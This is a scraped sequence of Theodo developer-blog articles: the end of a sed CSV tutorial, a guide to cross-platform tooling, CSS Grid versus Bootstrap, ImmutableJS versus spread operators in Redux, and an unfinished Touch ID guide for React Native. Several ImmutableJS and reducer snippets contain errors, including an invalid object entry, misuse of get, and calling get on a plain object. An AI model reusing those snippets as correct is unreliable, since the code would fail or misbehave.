this:\n\r\nfirst name;last name;id;thumbnail;email;url;enabled\r\nDan ;Smith;56543678;dan_profile.jpg;dan@test.com;user/dan;true\r\nJames ;Jones;56467654;james_profile.png;james@test.com;user/james;true\r\n\nInstead, we can do something like this:\nsed -r 's/^([a-zA-Z]*)( )(.*)$/\\1;\\3/' <test.csv >output.csv\nThis matches the space character, but also saves it into capture group \u2018\\2\u2019. We then substitute the whole match with \\1;\\3 \u2013 effectively putting everything back together without the space, and putting a \u2018;\u2019 character in its place. We now have our new columns, first name and last name.\nThere\u2019s actually an even easier solution than this, we just replace the first empty space in each row with a \u2018;\u2019 like this:\nsed -r 's/ /;/' <test.csv >output.csv\nThat was fast and easy!\nWe\u2019re left with a csv that looks like this:\n\r\nfirst name;last name;id;thumbnail;email;url;enabled\r\nDan;Smith;56543678;dan_profile.jpg;dan@test.com;user/dan;true\r\nJames;Jones;56467654;james_profile.png;james@test.com;user/james;true\r\n\nWith only a few commands, we\u2019ve managed to transform a csv from our terminal.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tDaniel Leary\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhen I first arrived at Theodo, my whole developer world was shaken. I used to work in a robotics company, developing in C++ and Python with a Ubuntu machine, deploying on a Debian environment. And within a week, I was asked to develop new features in Javascript, on a MacBook, that needed to be deployed on an iPhone 8 and a Nexus 5. I had no clue what tools I needed to use. I was not even able to install a simple thing on that stupid Mac that did not know my dear apt-get. But I still had to work, so I followed the guidelines of my new colleagues, installing dozens of things whose purpose were unknown to me.\nOnly a few days later did I realise that, actually, I had already used each one of the tools I was told to install. But different ones, for different platforms, and different languages. The principles were the same, the purposes were the same, but the names were not. And when I understood that, everything became much simpler.\nSo today, I offer to take you on a trip. A trip through a development project. And for each tool that we will encounter on that journey, we will see which one is used depending on the platform, the programming language, or the project nature.\nAre you ready?\nThen buckle up!\n\nGetting your environment ready\nAll right, turn on your computer, and let\u2019s get started. You just arrived at your new job, and you got your machine, but have no idea how to install on it the stuff you are supposed to use.\nIt usually comes in two flavours.\nCompiled executables\n\nThose executables are binary files, specifically made to be read by a specific system (OS and CPU architecture). In other words, you cannot use the same binary files on different machines, which is why you will always need to use something specific to YOURS. The consequence is that a developer must find a way to make binary files available for every supported system.\nAnd you need to find where they are. To make this easier, each platform provides a package manager, a tool made to install so called \u201cpackages\u201d. A package is an archive containing all the files needed for installation. The package manager knows where to look and automatically downloads the package upon request.\nThose binaries are generally installed \u201cglobally\u201d, in the \u201csystem\u201d part of the filesystem (/usr/lib, /Library, C://, \u2026). Any project on your machine will have access to it (that\u2019s cool, right?). The negative part is that you usually can have only one version installed (so if you need two different versions for two different projects, it might be painful).\n\n\n\n\n\n\n\n\n\n\n\nPackage manager\napt-get\nHomebrew\nChocolatey\n\n\nExecutables go in\n/usr/bin\n<PKG-ROOT>/bin\n\n\n\nLibraries go in\n/usr/lib\n<PKG-ROOT>/lib\n\n\n\nHeaders go in\n/usr/include\n<PKG-ROOT>/include\n\n\n\nResources go in\n/usr/share\n<PKG-ROOT>/share\n\n\n\nNatively installed\nYes\nNo\nNo\n\n\nComments\n\nPKG-ROOT is /usr/local/Cellar/<package>\nSymbolic links are then added in\n/usr/local/bin\n/usr/local/lib\n/usr/local/include\n/usr/local/share\nfor each package\nThere are many different installation rules. You can find more details here.\n\n\n\nUncompiled code\n\nCode can sometimes be directly executed without being compiled, using a program called an interpreter. Thanks to that, this code is not dependent of the machine it is run on, only of the language it is written into, and the interpreter version. It is then much more interesting for the developers to distribute their product via package managers related to the language they use rather than the platform you are using. Another difference is that these package managers use a repository containing the packages which can be installed, instead of storing them somewhere and pointing them out by a entry in a text file. Those packages are usually installed locally (directly in the project folder), so that only this project can use it. The good part is that you can use different versions of the same package for different projects.\n\n\n\n\nPackage manager\nMain registry\n\n\n\n\n\npip\nhttps://pypi.python.org/pypi\n\n\n\nyarn\nhttps://registry.yarnpkg.com\n\n\n\ncomposer\nhttps://packagist.org/packages/\n\n\n\nmaven\nhttps://mvnrepository.com/artifact/\n\n\n\ngem\nhttps://rubygems.org/gems/\n\n\n\n\n\n\n\nPackages go in\nComments\n\n\n\n\n\nA global folder on your system \npip stores packages in the root filesystem by default, in the user filesystem upon request. To store packages within the project, you need to use the virtualenv package\n\n\n\n./node_modules\nFor NodeJS also exists npm, which actually is the official one. Both are similar and works the same way, although yarn seems to be way faster\n\n\n\n./vendor\n\n\n\n\n./target/dependency/BOOT-INF/lib\n\n\n\n\nA global folder on your system \ngem also installs packages in a folder unrelated to your project, but you can choose which one it will be. To install packages in a folder specific to your project, you can use bundler\n\n\n\nHandling cross-platform development\n\nNow, let\u2019s say you are working on a project where your target is different from your development environment.\nThis is actually extremely common. You can be working on a website for instance (you probably don\u2019t have the exact same configuration as the server machine), or you could be developing a mobile application, or a library for a robot. You could also be working on a program that should be runnable on Mac AND Windows, etc..\nTo test that your product actually works on the target environment, you will need to use emulation tools (or have an equal number of devices and targets, which is not always practical). For mobile development, there are powerful simulators which allow the testing of several shapes of mobiles and several OS versions. They also allow the emulation of mobile-specific inputs, like GPS.\nThe ones I know about (there might be others):\n\nXCode\u2018s Simulator (iOS)\nAndroid Studio\u2019s emulator (Android)\nGenyMotion (Android)\n\nFor \u201ccomputer\u201d environments, you can use virtual environments. They can be created by:\n\nVagrant (virtual machine handler)\nDocker (virtual environment running on your real machine)\n\nDocker is lighter than a virtual machine, but provides less insulation (although this is not important in most projets). Also, only a Linux environment can be emulated. Vagrant is actually more a virtual machine manager. It is based on programs like VMWare and VirtualBox to build virtual machines from a script.\nTo know more about the difference between Docker and Virtual machines, you can have a look at this blog article which gives a generic explanation of the difference or this StackOverflow\u2019s answer giving more technical details.\nTesting your feature\n\nYou now have everything you need to install the dependencies of your project. You are ready to go, ready to develop on any platform, in any language. But after finishing your first feature, a new problem arises: tests.\nWhat are you supposed to use to test your code on this alien environment? Well thankfully, as you would expect, there is always at least one unit test library for each language.\n\n\n\n\nFramework\n\n\n\n\n\npytest\n\n\n\njest, mocha, chai\n\n\n\njunit\n\n\n\ngtest (among many others)\n\n\n\nphpunit\n\n\n\n(built-in)\n\n\n\nThere are of course several other kinds of tests (end to end, integration, api, stress, static type) but they are not as widely represented as unit tests, because their value relies more on the language, and what it is used for.\nFor instance, static type tests on c++ or java is useless (because proper typing is assured by the language itself). If you develop a graphical interface in python, you will need to use a specific framework, which will (or will not) provide end to end testing capabilities. But Python won\u2019t.\nAnother thing you might want to do is to make sure your project works under different versions of the language you use. To test that, you can use a language\u2019s version manager if it exists (so you don\u2019t need to use several VMs/docker images with different languages versions).\n\n\n\nLanguage\nVersion manager\n\n\n\n\n\nnvm\n\n\n\nrvm\n\n\n\npyenv\n\n\n\nThis feature is also widely used for solely development purposes, if different projects you are working on need different language versions. This helps you to keep a clean environment and is very handy.\nDeploying the feature\nAlright, your tests are fine, your code has been approved by a peer, now you need to push it into production.\nUntil now, we did not really care about the type of project you were working on (installing dependencies and testing your code is something to do in every project). But the deployment will be much more tied to the nature of the project. Besides, not only do we need to deploy our new feature, we also need to make sure our dependencies are available on the target machine.\nI am working on a library for others to use\nHere, \u201cdeploying to production\u201d means \u201cmaking the newest version available for download and installation\u201d. Do you remember what we said about package managers? That they help you install software made by others? Well, now you are on the other side of the mirror. So you need to ask yourself one simple question:\n\nAm I trying to distribute compiled code, which is therefore platform specific?\n\nWhichever the answer, you will need to look for how to build a package for one or more specific package managers.\nThe answer will only guide you in your selection. Platform-wise package managers, or language-related package managers?\nI am working on a web application\nIn this case, deploying to production means sending the newest version of your product on the server hosting it. The number of possible tools\u2019 combinations is too huge to be listed here, so only the main ones will be described.\n\nPack your application in a docker, send it to a docker host using docker api, then start your application with\n\nDocker Compose (starts one or more containers on one host)\nDocker Swarm (starts one or more containers on several hosts)\nKubernetes (very close to docker swarm, developed by Google)\nOr one of these\n\n\n\nTo know more, you can find a pretty good comparison of Kubernetes and Docker Swarm here.\n\nConfigure a remote machine to download your application (from github for instance) and its dependencies (also called \u201cprovisioning\u201d)\n\nChef\nCapistrano\nShipit (Alternative to capistrano in JS)\nAnsible\nand many others\n\n\n\nBy the way, although Chef and Capistrano are perfectly capable of deploying your app AND configuring the host server by themselves, it seems better to actually use both, as explained in this article.\nI am working on a mobile application\nIn this situation, you need to package your app and send it to a storing server. It is actually pretty similar to providing a library, except the tools use to package and upload the app are quite different. The main one I encounter is Fastlane\nAnd that\u2019s it\nHey, you made it. You actually managed to install your dependencies, on your machine and on the target system. You developed your feature using an emulated environment, and tested it using an appropriate unit test framework. Finally, you deployed your newly added feature to prod.\nCongratulations!\nYou managed to work efficiently, even in an alien environment.\nYou can be proud!\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tSurya Ambrose\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhy did I stop using\u00a0Bootstrap?\n\nBootstrap is too verbose: you need plenty of div even if you only have a couple of blocks in your layout\nThings get even worse when you add responsiveness\u2026\n\u2026 or when you want to move your blocks around\nBootstrap\u2019s grids are limited to 12 columns\nBy default, Bootstrap has 10-pixel paddings that are complex to override\nBootstrap has to be downloaded by the users, which slows down your website\n\nHow to create a layout for your website without Bootstrap\nLet\u2019s say you have the following layout that you want to integrate:\n\nWhat it would be like with Bootstrap\n<body>\r\n  <div class=\"container\">\r\n    <div class=\"row\">\r\n      <div class=\"col-12 header\">...</div>\r\n    </div>\r\n    <div class=\"row\">\r\n      <div class=\"col-4 navigation-menu\">...</div>\r\n      <div class=\"col-8 main-content\">...</div>\r\n    </div>\r\n    <div class=\"row\">\r\n      <div class=\"col-12 footer\">...</div>\r\n    </div>\r\n  </div>\r\n</body>\nEven though\u00a0there are only four blocks,\u00a0you needed nine different div to code your layout.\nHow much simpler it would be with CSS Grid\nThanks to CSS Grid, you can get the same result with only five div!\n<body>\r\n  <div class=\"container\">\r\n    <div class=\"header\">...</div>\r\n    <div class=\"navigation-menu\">...</div>\r\n    <div class=\"main-content\">...</div>\r\n    <div class=\"footer\">...</div>\r\n  </div>\r\n</body>\nThough it will not be as simple as just importing Bootstrap, you will have to add some extra CSS.\n.container {\r\n  display: grid;\r\n  grid-template-columns: repeat(12, 1fr);\r\n}\r\n.header {\r\n  grid-column: span 12;\r\n}\r\n.navigation-menu {\r\n  grid-column: span 4;\r\n}\r\n.main-content {\r\n  grid-column: span 8;\r\n}\r\n.footer {\r\n  grid-column: span 12;\r\n}\nIn the example above, you first defined the container as a 12-column grid.\nAnd then, you set the number of tracks the item will pass through.\nWhat about responsiveness?\nMoreover you may want to have a responsive layout for smartphones and tablets.\n\nWith Bootstrap\nAs the design gets more complex, your HTML also gets more complex with more and more classes:\n<body>\r\n  <div class=\"container\">\r\n    <div class=\"row\">\r\n      <div class=\"col-xs-12 header\">...</div>\r\n    </div>\r\n    <div class=\"row\">\r\n      <div class=\"col-xs-12 col-md-6 col-lg-4 navigation-menu\">...</div>\r\n      <div class=\"col-xs-12 col-md-6 col-lg-8 main-content\">...</div>\r\n    </div>\r\n    <div class=\"row\">\r\n      <div class=\"col-xs-12 footer\">...</div>\r\n    </div>\r\n  </div>\r\n</body>\nWith CSS Grid\nWith CSS Grid, if you want to add responsiveness to your layout, there is no need to change the HTML.\nYou only need to add some media queries to our CSS stylesheet:\n...\r\n@media screen and (max-width: 768px) {\r\n  .navigation-menu {\r\n    grid-column: span 6;\r\n  }\r\n  .main-content {\r\n    grid-column: span 6;\r\n  }\r\n}\r\n@media screen and (max-width: 480px) {\r\n  .navigation-menu {\r\n    grid-column: span 12;\r\n  }\r\n  .main-content {\r\n    grid-column: span 12;\r\n  }\r\n}\r\n\nWhat if you wanted to move your blocks around?\nLet\u2019s say that instead of the above layout on mobile, you wanted the navigation menu to be above the header:\n\nWith Bootstrap\nYou would have had to duplicate your menu, hide one and display the other on mobile and vice versa on desktop:\n<body>\r\n  <div class=\"container\">\r\n    <div class=\"row\">\r\n      <div class=\"col-xs-12 hidden-sm-up navigation-menu-mobile\">...</div>\r\n      <div class=\"col-xs-12 header\">...</div>\r\n    </div>\r\n    <div class=\"row\">\r\n      <div class=\"col-md-6 col-lg-4 hidden-xs-down navigation-menu\">...</div>\r\n      <div class=\"col-xs-12 col-md-6 col-lg-8 main-content\">...</div>\r\n    </div>\r\n    <div class=\"row\">\r\n      <div class=\"col-xs-12 footer\">...</div>\r\n    </div>\r\n  </div>\r\n</body>\nAnd the HTML gets more and more complex as your layout grows.\nWith CSS Grid\nYou only need one single line of CSS to move the navigation menu to the top on mobile and here is how to do so:\n...\r\n@media screen and (max-width: 480px) {\r\n  .navigation-menu {\r\n    grid-row: 1;\r\n    grid-column: span 12;\r\n  }\r\n  ...\r\n}\r\n\nCustomize your grid layout!\nHave as many or as few columns as you want\nBy default, Bootstrap comes with a 12-column grid system.\nThis value can be overridden but if you do so, it will be overridden everywhere in your app.\nOn the other hand, with CSS Grid, you can specify the number of columns per row for each of your grids.\nIn grid-template-columns: repeat(12, 1fr);, you can just set the number of columns you want instead of 12.\nUnwanted 10-pixel paddings\nBootstrap\u2019s columns have 10-pixel paddings on their right and left.\nThe most advised solution to override them is to use padding-right: 0 !important; and padding-left: 0 !important;.\nAs with CSS Grid you have control over all your CSS classes, you can set the paddings you want everywhere.\nNo more need to download any library\nEven if Bootstrap\u2019s stylesheet only weights a few kB, it still slows down the loading of your page.\nAll major browsers shipped their implementation of CSS Grid in 2017, so there is no need to download any extra CSS to use CSS Grid!\nAt the time of this article (April 2018), 89% of browsers are compatible with CSS Grid.\n\nThat\u2019s all for now!\nHere are\u00a0some of the main reasons why I no longer use Bootstrap.\nPart 2 on how I also managed to replace Flexbox with CSS Grid is coming!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tC\u00e9dric Kui\r\n  \t\t\t\r\n  \t\t\t\tI enjoy browsing cat and panda GIFs while drinking tea. Oh, I am also a Web Developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhat is this article about?\nWhen I first learned about ImmutableJS I was convinced it was a great addition to any project.\nSo I tried to make it a working standard at Theodo.\nAs we offer scrum web development teams for various projects going from POC for startups to years lasting ones for banks, we bootstrap applications all the time and we need to make a success of all of them!\nSo we put a strong emphasis on generalizing every finding and learning made on individual projects.\nWith this objective in mind we are determining which technical stack would be the best for our new projects.\nEach developer contributes to this effort by improving the company\u2019s technical stack whenever they makes a new learning.\nWhen React was chosen as our component library we were just embarking on a hard journey that you may have experienced: making the dozens other decisions that come with a React app.\nReact then what?\nOne of those choices lead us to choose redux as our global state management lib.\nWe noticed that people were having troubles with Immutability in reducers, one of the three core principles of Redux\nThe first possibility to answer this purpose is defensive copying with ES6 spread operator { ...object }.\nThe second option we studied is Facebook\u2019s ImmutableJS library.\n\nUsing ImmutableJS in your react-redux app means that you will no longer use JS data structures (objects, arrays) but immutable data structures (i.e. Map, List, \u2026) and their methods like .set(), .get(). Using .set() on a Map, the Immutable equivalent of objects, returns a new Map with said modifications and does not alter previous Map.\nIn order to make an informed choice I observed the practices on projects that used either one of the two, gathered their issues and tried to find solutions for them.\nThis article is the result of this study and hopefully it will help you choose between those two!\nIn this first part I will compare those two options in the light of 3 criteria out of the 5 I studied: readability, maintainability and learning curve.\nThe second part of this study, coming soon, will explore performance and synergy with typing tools.\nFirst Criterion, Readability: Immutable Wins!\nIf your state is nested and you use spread operators to achieve immutability, it can quickly become unreadable:\nfunction reducer(state = defaultState, action) {\r\n  switch (action.type) {\r\n    case 'SET_HEROES_TO_GROUP':\r\n      return {\r\n        ...state,\r\n        guilds: {\r\n          ...state.guilds,\r\n          [action.payload.guildId]: {\r\n            ...state.guilds[action.payload.guildId],\r\n            groups: {\r\n              ...state.guilds[action.payload.guildId].groups,\r\n              [action.payload.groupId]: {\r\n                ...state.guilds[action.payload.guildId].groups[action.payload.groupId],\r\n                action.payload.heroes,\r\n              },\r\n            },\r\n          },\r\n        },\r\n      };\r\n  }\r\n}\r\n\nIf you ever come across such a reducer during a Code Review there is no doubt you will have troubles to make sure that no subpart of the state is mutated by mistake.\nWhereas the same function can be written with ImmutableJS in a much simpler way\nfunction reducer(state = defaultState, action) {\r\n  switch (action.type) {\r\n    case 'SET_HEROES_TO_GROUP':\r\n\r\n      return state.mergeDeep(\r\n        state,\r\n        { guilds: { groups: { heroes: action.payload.heroes } } },\r\n      ).toJS();\r\n  }\r\n}\r\n\nConclusion for Readability\nImmutableJS obviously wins this criteria by far if your state is nested.\nOne counter measure you can take is to normalize your state, for example with normalizr.\nWith normalizr, you never have to change your state on more than two levels of depth as shown on below reducer case.\n// Defensive copying with spread operator\r\ncase COMMENT_ACTION_TYPES.ADD_COMMENT: {\r\n  return {\r\n    ...state,\r\n    entities: { ...state.entities, ...action.payload.comment },\r\n  };\r\n}\r\n\r\n// ImmutableJS\r\ncase COMMENT_ACTION_TYPES.ADD_COMMENT: {\r\n  return state.set('entities', state.get('entities').merge(Immutable.fromJS(action.payload.comment)));\r\n}\r\n\nSecond Criterion, Maintainability and Preventing Bugs: Immutable Wins Again!\nA question I already started to answer earlier is: Why must our state be immutable?\n\nBecause redux is based on it\nBecause it will avoid bugs in your app\n\nIf for example your state is:\nconst state = {\r\n  guilds: [\r\n    // list of guilds with name and heroes\r\n    { id: 1, name: 'Guild 1', heroes: [/*array of heroes objects*/]},\r\n  ],\r\n};\r\n\nAnd your reducer case to change the name of a guild is:\nswitch (action.type) {\r\n  case CHANGE_GUILD_NAME: {\r\n    const guildIndex = state.guilds.findIndex(guild => guild.id === action.payload.guildId);\r\n\r\n    const modifiedGuild = state.guilds[guildIndex];\r\n    // here we do a bad thing: we modifi the old Guild 1 object without copying first, its the same reference\r\n    modifiedGuild.name = action.payload.newName;\r\n\r\n    // Here we do the right thing: we copy the array so that we do not mutate previous guilds\r\n    const copiedAndModifiedGuilds = [...state.guilds];\r\n    copiedAndModifiedGuilds[guildIndex] = modifiedGuild;\r\n\r\n    return {\r\n      ...state,\r\n      guilds: copiedAndModifiedGuilds,\r\n    };\r\n  }\r\n}\r\n\nAfter doing this update, if you are on a detail page for Guild 1, the name will not update itself!\nThe reason for this is that in order to know when to re-render a component, React does a shallow comparison, i.e. oldGuild1Object === newGuild1Object but this only compares the reference of those two objects.\nWe saw that the references are the same hence no component update.\nAn ImmutableJS data structure always returns a new reference when you modify an object so you never have to worry about immutability.\nUsing spread operators and missing one level of copy will make you waste hours looking for it.\nAnother important issue is that having both javascript and Immutable objects is not easily maintainable and very bug-prone.\nAs you cannot avoid JS objects, you end up with a mess of toJS and fromJS conversions, which can lead to component rendering too often.\nWhen you convert an Immutable object to JS with toJS, it creates a new reference even if the object itself has not changed, thus triggering component renders.\nConclusion for Maintainability\nImmutable ensures you cannot have immutability related bugs, so you won\u2019t have to check this when coding or during Code review.\nOne way to achieve the same without Immutable would be to replace the built-in immutability with immutability tests in your reducers.\nit('should modify state immutably', () => {\r\n  const state = reducer(mockConcatFeedContentState, action);\r\n\r\n  // here we check that all before/after objects are not the same reference -> not.toBe()\r\n  expect(state).not.toBe(mockConcatFeedContentState);\r\n  expect(state.entities).not.toBe(mockConcatFeedContentState.entities);\r\n  expect(state.entities['fakeId']).not.toBe(mockConcatFeedContentState.entities['fakeId']);\r\n});\r\n\nBut making sure that your team-mates understand and always write such tests can be as painful as reading spread operators filled reducers.\nMy opinion is that Immutable is the best choice here on the condition that you use it as widely as possible in your app, thus limiting your use of toJS.\nThird Criterion, Learning Curve: One point for Spread Operators\nOne important point when assessing the pros and cons of a library/stack is how easy will it be for new developers to learn it and to become autonomous on the project.\nThe results of my analysis on half a dozen projects using is that learning ImmutableJS is hard work.\nYou have a dozen data structures to choose from, about two dozen built-ins or methods that sometimes do not behave the same way javascript methods do.\nBelow are some examples of such differences:\nconst hero = {\r\n  id: 1,\r\n  name: 'Superman',\r\n  abilities: ['Laser', 'Super strength'],\r\n}\r\n\r\nconst immutableHero = Immutable.fromJS(hero); // converts objects and arrays to the ImmutableJS equivalent\r\n\r\n\r\n// get a property value\r\nhero.abilities[0] // 'Laser'\r\nimmutableHero.get('abilities', 0) // 'Laser'\r\n\r\n// set a property value\r\nhero.name = 'Not Superman'\r\nimmutableHero.set('name', 'Not Superman')\r\n\r\nimmutableHero.name = 'Not Superman' // nothing happens!\r\n\r\n// Number of elements in an array / Immutable equivalent\r\nhero.abilities.length // 2\r\nhero.get('abilities').size // 2\r\n\r\n// Working with indexes\r\nconst weaknessIndex = hero.abilities.indexOf('weakness') // -1\r\nhero.abilities[weaknessIndex] // throws Error\r\n\r\nconst immutableWeaknessIndex = immutableHero.get('abilities').indexOf('weakness') // -1\r\nimmutableHero.get('abilities').get(weaknessIndex) // 'Super strength'\r\n\nWhile you can use all the knowledge you have on javascript and ES6, if you go with ImmutableJS you\u2019ll have to learn some things from the start.\nNicolas, a colleague of mine once came to me with a strange issue.\nThey were using normalizr and had a state that looked like the Immutable equivalent of this:\n{\r\n  fundState: {\r\n    fundIds: // a list of fund ids\r\n    fundsById: // an object with a fund id as key and the fund data as value: { fund1Id: fund1 },\r\n  }\r\n}\r\n\nTheir problem was that their ids, indexing funds in fundsById Map where strings of numbers and not numbers.\nAt least twice, one of their developers had a hard time writing a feature because they were trying to get the funds like this: state.get('fundState', 'fundsById', 3) to get the fund of id 3.\nThe issue here is that contrary to javascript, strings of numbers and numbers are not at all interchangeable (it may be a good thing but it is an important difference!).\nSo they had to convert all their id keys to the right type.\nAnother issue that colleagues shared with me was that ImmutableJS is really hard to debug in the console as shown below with our immutableHero object from above:\n\nAs you can see, it\u2019s nearly unreadable and its only a really simple object!\nA great solution I encountered when trying to help them is immutable formatter a chrome extension that turns what you saw into this beauty:\n\nTo enable it, you have to open chrome dev tools. Then access the dev tools settings and check \u201cenable custom formatter\u201d option:\n\nIn the case of ES6, new developers have three things to learn:\n\nUnderstand why immutability is important and why they should bother\nHow to use spread operators to enforce immutability\nNot to use object.key = value to modify their state\n\nConclusion for Learning Curve\nOverall the learning curve for spread operators, an ES6 tool is rather easy since you can still use all the javascript you know and love but you must be careful to the points listed above.\nImmutableJS on the other hand will be much harder to learn and master.\nConclusion for Part 1\nIn conclusion, this first part showed us that ImmutableJS comes with a lot of nice things, allows you to concentrate on working on value added work rather than trying to read horrible reducers or looking for hidden bugs.\nThis of course is at the cost of the steeper learning curve of a rich API and some paradigms different from what you are used to!\nIn the part II of this article I will compare both solutions in the light of Performance and compatibility with typing.\nIf you liked this article and want to know more, follow me on twitter so you know when the second part is ready :).\n@jeremy_dardour\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJ\u00e9r\u00e9my Dardour\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tMost modern smart phones have a built-in fingerprint sensor.\nOn iOS, this feature is called Touch ID whereas on Android, it is generally referred to as \u201cFingerprint Authentication\u201d.\nPeople most commonly use it to unlock their device by simply pressing their finger on the fingerprint sensor.\n\nIt is a cool technology and as a React-Native developer you can actually integrate Touch ID* into your apps by using the react-native-touch-id library.\n[*I will refer to this feature as \u201cTouch ID\u201d for the rest of the article. But everything here applies to both iOS and Android unless stated otherwise.]\nThere are various use cases for Touch ID and they generally fall within one of two categories:\n\nIncrease the security of your app\n\nThis is commonly done by adding a Touch ID lock.\nPopular examples are Dropbox, Outlook, Revolut and LastPass\n\n\nMake your app more user-friendly\n\nThe most common use case in this category is the Touch ID login\nThis is very popular in banking apps such as HSBC, Barclays and Halifax\n\n\n\nYou can use the diagram below to decide how you should use Touch ID in your app:\n\nIn this article, I will explain how to add Touch ID to your React Native app and how you can implement a Touch ID Lock or Touch ID Login.\nAuthentication with Touch ID\nThere is an excellent library called react-native-touch-id that lets you easily prompt your users for Touch ID authentication.\nBefore you can use it, you need to install and link the library:\nyarn add react-native-touch-id            # Install the JS package\r\nreact-native link react-native-touch-id   # Link the library\r\n\nOnce that is done, you can prompt the user to authenticate with Touch ID:\nimport TouchID from 'react-native-touch-id';\r\n\r\nTouchID.authenticate('Authenticate with fingerprint') // Show the Touch ID prompt\r\n  .then(success => {\r\n    // Touch ID authentication was successful!\r\n    // Handle the successs case now\r\n  })\r\n  .catch(error => {\r\n    // Touch ID Authentication failed (or there was an error)!\r\n    // Also triggered if the user cancels the Touch ID prompt\r\n    // On iOS and some Android versions, `error.message` will tell you what went wrong\r\n  });\r\n\nThe code above will trigger the following prompt:\n\nThe TouchID library contains one more method, called isSupported.\nAs the name suggests, it allows you to check if the user\u2019s device supports Touch ID.\nNo matter which use case you decide on, you will want to make this check before you ask your user to authenticate with Touch ID:\nimport TouchID from 'react-native-touch-id';\r\n\r\nTouchID.isSupported()\r\n  .then(biometryType => {\r\n    if (biometryType === 'TouchID') {\r\n      // Touch ID is supported on iOS\r\n    } else if (biometryType === 'FaceID') {\r\n      // Face ID is supported on iOS\r\n    } else if (biometryType === true) {\r\n      // Touch ID is supported on Android\r\n    }\r\n  })\r\n  .catch(error => {\r\n    // User's device does not support Touch ID (or Face ID)\r\n    // This case is also triggered if users have not enabled Touch ID on their device\r\n  });\r\n\nNote for iPhone X: On iOS, react-native-touch-id actually supports both Touch ID and Face ID.\nWhen you call TouchID.authenticate, the library will figure out which authentication method to use and show the correct prompt to the user.\nIt makes no difference in the way you use the library.\nHowever, you should make sure to adjust the language of your app.\nDon\u2019t say \u201cTouch ID\u201d when you actually mean \u201cFace ID\u201d.\nYou can use the TouchID.isSupported method to get the correct biometry type for your iOS users.\nWhen not to use Touch ID\nTouch ID is a great addition for most apps.\nBut there cases in which it doesn\u2019t really make sense to add Touch ID.\nGenerally speaking, if your app has no notion of user accounts, then you will have a hard time finding a good use for Touch ID.\nWithout user accounts, there is usually nothing private on the app that would benefit from protection.\nTouch ID Lock: Make your app more secure\nThe Touch ID lock is the most popular use of Touch ID in modern apps:\n\nWhenever the app is opened, the user is presented with a lock screen and asked to authenticate via Touch ID.\nOnly if authentication is successful will the user gain access to the app.\nThis is a great way to integrate Touch ID in your app.\nYour users get a whole layer of additional security and the cost in user experience is minimal.\nAdding a\u00a0Touch ID lock\u00a0makes the most sense if\n\nyour users have to sign in to use the app (and there is something worth protecting)\nyour users remain signed in (otherwise there is no real security gain)\n\nImplementing the Touch ID lock\nAdding the actual Touch ID authentication layer is simple.\nYou could create a Lock component that wraps around your app:\nimport React from 'react';\r\nimport TouchID from 'react-native-touch-id';\r\nimport App from './App';\r\nimport Fallback from './Fallback';\r\n\r\nclass Lock extends React.PureComponent {\r\n  state = { locked: true };\r\n\r\n  componentDidMount() {\r\n    TouchID.authenticate('Unlock with your fingerprint').then(success =>\r\n      this.setState({ locked: false }),\r\n    );\r\n  }\r\n\r\n  render() {\r\n    if (this.state.locked) {\r\n      return <Fallback />;\r\n    }\r\n\r\n    return <App />;\r\n  }\r\n}\r\n\nThis component prompts the Touch ID authentication as soon as it mounts.\nIf authentication is successful, it renders your app (\u201cunlocking\u201d it).\nIf authentication is not successful, it renders a fallback component.\nAnd handling the fallback is where the actual complexity of the Touch ID lock lies.\nHandling the fallback\nWhat happens if Touch ID no longer works for your user?\nThis could be due to something simple like wet fingers.\nOr it could be that the fingerprint sensor in your users device has broken.\nIf you don\u2019t handle the fallback correctly, your users will be locked out of your app.\nThe most popular option for handling the fallback is actually inspired by the iOS lock screen itself: a passcode lock.\n\nPasscodes are still relatively quick to unlock for your user, and they do a good job of keeping the app secure.\nI haven\u2019t been able to find a good library for adding a passcode input.\nBut you might prefer to implement your own UI components anyway.\nWhere should you store the user\u2019s passcode?\nThe simplest option would be to store the passcode on the users device itself.\nI would recommend against using React Native\u2019s built-in Async Storage.\nIt does not encrypt your data and anyone with access to the physical device will be able to read the code in plaintext.\nInstead, I recommend using react-native-keychain which allows you to store credentials in your phone\u2019s secure storage (the \u201ckeychain\u201d in iOS and the \u201ckeystore\u201d on Android).\nHandling the fallback of the fallback\nWhat happens if your user forgets the 